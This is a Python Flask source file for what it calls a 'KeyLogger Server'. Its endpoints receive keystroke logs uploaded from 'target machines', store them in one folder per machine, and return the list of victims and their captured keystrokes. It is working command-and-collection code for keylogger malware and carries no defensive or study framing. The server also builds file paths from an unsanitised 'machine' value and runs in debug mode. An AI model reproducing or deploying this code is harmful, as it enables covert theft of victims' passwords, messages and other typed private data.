from flask import Flask, request, jsonify
import os
import time

app = Flask(__name__)

DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/')
def home():
    return "KeyLogger Server is Running"


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200


@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    machines = [x for x in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, x))]
    return jsonify({"machines": machines}), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine = request.args.get('machine')
    if not machine:
        return jsonify({"error": "Machine parameter is required"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    logs = {}
    for filename in os.listdir(machine_folder):
        file_path = os.path.join(machine_folder, filename)
        with open(file_path, "r", encoding="utf-8") as f:
            logs[filename] = f.read()

    return jsonify({"logs": logs}), 200

if __name__ == "__main__":
    app.run(debug=True)

